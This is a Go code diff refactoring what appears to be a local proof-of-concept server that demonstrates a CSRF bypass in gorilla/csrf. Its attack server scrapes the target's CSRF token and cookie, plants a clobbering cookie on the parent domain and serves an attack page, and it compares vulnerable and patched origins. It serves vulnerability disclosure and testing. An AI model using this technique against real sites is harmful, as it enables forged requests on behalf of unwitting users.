@@ -3,7 +3,7 @@ package main
 import (
 	"bytes"
 	"crypto/tls"
-	_ "embed"
+	"embed"
 	"encoding/json"
 	"flag"
 	"fmt"
@@ -15,6 +15,7 @@ import (
 	"net/http/cookiejar"
 	"strings"
 	"sync"
+	"time"
 
 	safe "csrf/fixed"
 	csrf "csrf/vulnerable"
@@ -23,25 +24,29 @@ import (
 )
 
 var (
-	//go:embed attacker.html
-	attackerTemplateBytes []byte
-	attackerTemplate      = template.Must(template.New("attacker").Parse(string(attackerTemplateBytes)))
-
-	//go:embed target.html
-	targetTemplateBytes []byte
-	targetTemplate      = template.Must(template.New("target").Parse(string(targetTemplateBytes)))
+	//go:embed static/*
+	staticFS    embed.FS
+	assetHTTPFS http.FileSystem
+	templates   = template.Must(template.New("templates").ParseFS(staticFS, "static/*.html"))
 
 	// CLI flags
 	domain      = flag.String("domain", "example.test", "domain to use for the demo (bind it, target.$DOMAIN, and attack.$DOMAIN to localhost with /etc/hosts)")
 	listen      = flag.String("listen", ":443", "address to listen on")
 	tlsCertFile = flag.String("tls-cert", "", "path to TLS certificate file")
 	tlsKeyFile  = flag.String("tls-key", "", "path to TLS key file")
+	dev         = flag.Bool("dev", false, "load assets from disk instead of embedded FS")
 )
 
 func main() {
 	flag.Parse()
 	var ln net.Listener
 	var err error
+
+	if *dev {
+		assetHTTPFS = http.Dir("./static")
+	} else {
+		assetHTTPFS = http.FS(staticFS)
+	}
 
 	if *tlsCertFile != "" && *tlsKeyFile != "" {
 		crt, err := tls.LoadX509KeyPair(*tlsCertFile, *tlsKeyFile)
@@ -62,30 +67,32 @@ func main() {
 	}
 
 	log.Printf("listening on %s", ln.Addr())
+	h := targetOriginHandler()
 
 	// vulnerable origin with current gorilla/csrf
-	vulnerableOrigin := csrf.Protect([]byte("32-byte-long-auth-key"), csrf.Secure(true))(http.HandlerFunc(targetOriginHandler))
-	// safe origin with patched gorilla/csrf
-	safeOrigin := safe.Protect([]byte("32-byte-long-auth-key"), safe.Secure(true))(http.HandlerFunc(targetOriginHandler))
+	vulnerableOrigin := csrf.Protect([]byte("32-byte-long-auth-key"), csrf.Secure(true))(h)
 
-	// safe origin with patched gorilla/csrf that permits cross-origin requests
+	// safe origin with patched gorilla/csrf
+	safeOrigin := safe.Protect([]byte("32-byte-long-auth-key"), safe.Secure(true))(h)
+
+	// safe origin with patched gorilla/csrf that allows cross-origin requests
 	// from our attacker host
 	trustedCrossOrigin := safe.Protect(
 		[]byte("32-byte-long-auth-key"),
 		safe.Secure(true),
 		safe.TrustedOrigins([]string{fmt.Sprintf("attack.%s", *domain)}),
-	)(http.HandlerFunc(targetOriginHandler))
+	)(h)
 
-	as := newAttackerServer(*domain)
+	as := newAttackServer(*domain)
 
 	if err := http.Serve(ln, http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
 		switch {
+		case strings.HasPrefix(r.Host, "attack."):
+			as.ServeHTTP(w, r)
 		case strings.HasPrefix(r.Host, "safe."):
 			safeOrigin.ServeHTTP(w, r)
 		case strings.HasPrefix(r.Host, "trusted."):
 			trustedCrossOrigin.ServeHTTP(w, r)
-		case strings.HasPrefix(r.Host, "attack."):
-			as.ServeHTTP(w, r)
 		case strings.HasPrefix(r.Host, "target."):
 			vulnerableOrigin.ServeHTTP(w, r)
 		default:
@@ -101,11 +108,13 @@ func serveTargetHome(w http.ResponseWriter, r *http.Request) {
 		csrf.TemplateTag: csrf.TemplateField(r),
 		"CSRFToken":      csrf.Token(r),
 		"Domain":         *domain,
+		"Today":          time.Now().Format("2006-01-02"),
+		"SafeOrigin":     strings.HasPrefix(r.Host, "safe."),
 	}
 	w.Header().Set("Content-Type", "text/html")
 
 	b := bytes.NewBuffer(nil)
-	if err := targetTemplate.Execute(b, data); err != nil {
+	if err := templates.ExecuteTemplate(b, "target.html", data); err != nil {
 		http.Error(w, err.Error(), http.StatusInternalServerError)
 		return
 	}
@@ -131,27 +140,21 @@ func serveParams(w http.ResponseWriter, r *http.Request) {
 	}
 }
 
-func targetOriginHandler(w http.ResponseWriter, r *http.Request) {
-	switch r.Method {
-	case "GET":
-		switch r.URL.Path {
-		case "/":
-			serveTargetHome(w, r)
-		case "/params.json":
-			serveParams(w, r)
-		default:
-			http.Error(w, "not found", http.StatusNotFound)
-		}
-	case "POST":
-		if r.URL.Path == "/submit" {
-			io.WriteString(w, "SUCCESSFUL POST REQUEST")
-			return
-		}
-		http.Error(w, "invalid POST request", http.StatusBadRequest)
-	}
+func targetOriginHandler() http.Handler {
+	mux := http.NewServeMux()
+	mux.HandleFunc("GET /params.json", serveParams)
+	mux.HandleFunc("POST /submit", func(w http.ResponseWriter, r *http.Request) {
+		io.WriteString(w, "SUCCESSFUL POST REQUEST")
+	})
+	mux.Handle("GET /static/", http.FileServer(assetHTTPFS))
+	mux.HandleFunc("GET /", serveTargetHome)
+	return mux
 }
 
-type attackerServer struct {
+// attackServer is the server that serves the attack page. It wraps a HTTP
+// client used to scrape the target origin for CSRF cookie and token
+// values to interpolate into pages it serves.
+type attackServer struct {
 	// target to scrape/CSRF attack
 	target string
 	// current cookie identify to use for CSRF attack
@@ -162,30 +165,40 @@ type attackerServer struct {
 	client *http.Client
 }
 
-func newAttackerServer(target string) *attackerServer {
+// newAttackServer creates a new attack server pointed at the specified target.
+func newAttackServer(target string) *attackServer {
 	jar, err := cookiejar.New(&cookiejar.Options{PublicSuffixList: publicsuffix.List})
 	if err != nil {
 		log.Fatal(err)
 	}
 	client := &http.Client{Jar: jar}
 
-	return &attackerServer{
+	return &attackServer{
 		target:      target,
 		client:      client,
 		scrapeMutex: sync.Mutex{},
 	}
 }
 
-func (as *attackerServer) ServeHTTP(w http.ResponseWriter, r *http.Request) {
+func (as *attackServer) ServeHTTP(w http.ResponseWriter, r *http.Request) {
 	switch r.Method {
 	case "GET":
-		as.attackerOriginHandler(w, r)
+		if strings.HasPrefix(r.URL.Path, "/static/") {
+			http.FileServer(assetHTTPFS).ServeHTTP(w, r)
+			return
+		}
+		as.attackOriginHandler(w, r)
 	default:
 		http.Error(w, "invalid method", http.StatusMethodNotAllowed)
 	}
 }
 
-func (as *attackerServer) attackerOriginHandler(w http.ResponseWriter, _ *http.Request) {
+// attackOriginHandler serves the attack page. It first scrapes the target for a
+// valid CSRF token and cookie combination to use in its attack. It sets the
+// CSRF cookie for the common top-level domain (e.g. example.test) using the
+// exfiltrated value scraped from the target. Finally, it templates
+// the attacker page with the scraped token and cookie values.
+func (as *attackServer) attackOriginHandler(w http.ResponseWriter, _ *http.Request) {
 	// make request to the target origin to fetch CSRF token & cookie values
 	token, cookie, err := as.scrapeTarget(*domain)
 	if err != nil {
@@ -203,18 +216,16 @@ func (as *attackerServer) attackerOriginHandler(w http.ResponseWriter, _ *http.R
 	}
 	http.SetCookie(w, &clobberCookie)
 
-	// Set Referrer-Policy to no-referrer to prevent leaking the attacker origin
-	// w.Header().Set("Referrer-Policy", "no-referrer")
-
 	// template the attacker page
 	w.Header().Set("Content-Type", "text/html")
 	data := map[string]any{
 		"Domain": *domain,
 		"Token":  token,
 		"Cookie": cookie,
+		"Today":  time.Now().Format("2006-01-02"),
 	}
 	b := bytes.NewBuffer(nil)
-	if err := attackerTemplate.Execute(b, data); err != nil {
+	if err := templates.ExecuteTemplate(b, "attack.html", data); err != nil {
 		http.Error(w, err.Error(), http.StatusInternalServerError)
 		return
 	}
@@ -224,7 +235,12 @@ func (as *attackerServer) attackerOriginHandler(w http.ResponseWriter, _ *http.R
 	}
 }
 
-func (as *attackerServer) scrapeTarget(domain string) (token, cookie string, err error) {
+// scrapeTarget scrapes the target origin for a CSRF token and cookie value.
+func (as *attackServer) scrapeTarget(domain string) (token, cookie string, err error) {
+	as.scrapeMutex.Lock()
+	defer as.scrapeMutex.Unlock()
+
+	// fetch CSRF token & cookie from the target origin
 	resp, err := as.client.Get(fmt.Sprintf("https://target.%s/params.json", domain))
 	if err != nil {
 		return "", "", err
@@ -245,8 +261,7 @@ func (as *attackerServer) scrapeTarget(domain string) (token, cookie string, err
 	cookieHeader := resp.Header.Get("Set-Cookie")
 	if strings.HasPrefix(cookieHeader, "_gorilla_csrf=") {
 		cookieParts := strings.Split(cookieHeader, ";")
-		cookieHeader = cookieParts[0]
-		cookie = strings.TrimPrefix(cookieHeader, "_gorilla_csrf=")
+		cookie = strings.TrimPrefix(cookieParts[0], "_gorilla_csrf=")
 	}
 
 	if params.Token == "" {
